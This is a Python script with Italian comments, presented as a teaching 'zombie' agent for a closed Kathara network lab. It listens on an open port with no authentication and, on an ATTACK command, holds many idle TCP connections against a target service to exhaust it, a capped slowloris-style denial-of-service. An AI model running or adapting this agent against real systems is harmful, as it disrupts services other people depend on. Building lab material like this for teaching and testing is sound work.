#!/usr/bin/env python3
"""
zombie.py - agente didattico per laboratorio Kathara.
Riceve un comando ATTACK dal controller e apre connessioni TCP controllate verso il servizio target.
Il carico è volutamente limitato e temporizzato per test di disponibilità in ambiente chiuso.
"""
import socket
import sys
import threading
import time

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 9999
MAX_CONNECTIONS = 100
MAX_DURATION = 180
DEFAULT_CONNECTIONS = 30
DEFAULT_DURATION = 60


def open_and_hold(target_ip: str, target_port: int, hold_seconds: int) -> None:
    try:
        with socket.create_connection((target_ip, target_port), timeout=3) as s:
            # Non invia subito una scelta valida: il servizio resta impegnato fino al timeout applicativo.
            deadline = time.time() + hold_seconds
            while time.time() < deadline:
                time.sleep(1)
    except Exception:
        pass


def run_load(target_ip: str, target_port: int, connections: int, duration: int) -> None:
    connections = max(1, min(connections, MAX_CONNECTIONS))
    duration = max(1, min(duration, MAX_DURATION))
    print(f"[Zombie] Carico controllato verso {target_ip}:{target_port}: {connections} connessioni per {duration}s", flush=True)

    threads = []
    for _ in range(connections):
        t = threading.Thread(target=open_and_hold, args=(target_ip, target_port, duration), daemon=True)
        t.start()
        threads.append(t)
        time.sleep(0.02)

    # Non blocca il listener per tutta la durata, ma lascia traccia del completamento in background.
    def joiner():
        for t in threads:
            t.join()
        print("[Zombie] Carico terminato", flush=True)

    threading.Thread(target=joiner, daemon=True).start()


def parse_command(data: str):
    parts = data.strip().split()
    if len(parts) < 3 or parts[0].upper() != "ATTACK":
        raise ValueError("comando non valido. Formato: ATTACK <ip> <porta> [connessioni] [durata]")
    target_ip = parts[1]
    target_port = int(parts[2])
    connections = int(parts[3]) if len(parts) >= 4 else DEFAULT_CONNECTIONS
    duration = int(parts[4]) if len(parts) >= 5 else DEFAULT_DURATION
    return target_ip, target_port, connections, duration


def main() -> int:
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((LISTEN_HOST, LISTEN_PORT))
    server_socket.listen(5)
    print(f"[Zombie] In ascolto su {LISTEN_HOST}:{LISTEN_PORT}", flush=True)

    while True:
        conn, addr = server_socket.accept()
        with conn:
            try:
                data = conn.recv(1024).decode(errors="ignore")
                target_ip, target_port, connections, duration = parse_command(data)
                run_load(target_ip, target_port, connections, duration)
                conn.sendall(b"STARTED\n")
            except Exception as exc:
                msg = f"ERROR {exc}\n"
                conn.sendall(msg.encode())
                print(f"[Zombie] Comando rifiutato da {addr}: {exc}", flush=True)


if __name__ == "__main__":
    sys.exit(main())
